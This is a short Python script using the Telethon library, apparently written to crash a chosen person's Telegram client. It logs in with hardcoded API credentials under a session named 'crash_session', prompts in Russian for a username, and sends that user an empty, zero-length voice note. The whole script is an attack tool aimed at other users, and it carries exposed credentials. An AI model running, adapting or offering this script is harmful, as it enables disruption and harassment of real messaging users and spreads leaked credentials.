from telethon import TelegramClient
import asyncio

api_id = 37131412
api_hash = 'b4d6fbf9fbe52b119320daeabb6ccd4'
session = 'crash_session'

client = TelegramClient(session, api_id, api_hash)

async def main():
    await client.start()
    username = input('Введите юзернейм: ')
    user = await client.get_entity(username)
    await client.send_file(user, b'', voice_note=True, duration=0)

asyncio.run(main())
